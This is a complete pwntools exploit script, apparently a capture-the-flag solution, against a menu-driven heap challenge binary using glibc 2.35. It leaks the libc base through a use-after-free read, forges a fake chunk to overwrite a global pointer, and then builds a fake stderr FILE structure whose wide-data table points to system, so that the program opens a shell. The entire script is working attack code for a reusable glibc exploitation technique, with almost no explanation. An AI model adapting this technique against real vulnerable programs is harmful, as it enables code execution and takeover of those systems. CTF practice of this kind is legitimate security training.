#!/usr/bin/env python3

from pwn import *
import time

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe

if args.LOCAL:
    p = process([exe.path])
    if args.GDB:
        gdb.attach(p)
        pause()
else:
    p = remote("localhost", 5000)

# good luck pwning :)

def c(idx, data):
    p.sendlineafter(b"5. Exit", b"1")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Data: ", data)

def r(idx):
    p.sendlineafter(b"5. Exit", b"2")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.recvuntil(b"Content: ")
    return p.recvline().strip()

def u(idx, data):
    p.sendlineafter(b"5. Exit", b"3")
    p.sendlineafter(b"Index: ", str(idx).encode())
    p.sendlineafter(b"Data: ", data)

def d(idx):
    p.sendlineafter(b"5. Exit", b"4")
    p.sendlineafter(b"Index: ", str(idx).encode())

c(0, b"aaaa")
c(1, b"bbbb")
d(0)

libc_base = u64(r(0).ljust(8, b"\x00")) - 0x21ace0
libc.address = libc_base
print(hex(libc_base))

target = 0x404050
last_chunk = 0x404068
payload = flat(
    0x0,
    0x1001,
    target - 0x18,
    target - 0x10,
    last_chunk - 0x28,
    last_chunk - 0x20,
    b"\x00"*0xfd0,
    0x1000
)
u(0, payload)

d(1)

payload = flat(
    0x0, 

    # dont touch this stderr here
    libc_base + 0x21b6a0, 0x0,

    # write pointer to stderr struct
    libc_base + 0x21b6a0, 

    # prepare a pointer to system
    libc.sym.system,

    # forge _wide_data
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    # use pointer to system
    0x404058 - 0x68, 0,
)
u(0, payload)

# attack stderr
file_struct = FileStructure()
file_struct.flags = b" sh"
file_struct._IO_write_base = 0
file_struct._IO_write_ptr = 1
file_struct._wide_data = 0x404060
file_struct.vtable = libc_base + 0x2170c0
payload = bytes(file_struct)

u(0, payload)

time.sleep(0.5)
p.sendline(b"5")

p.interactive()
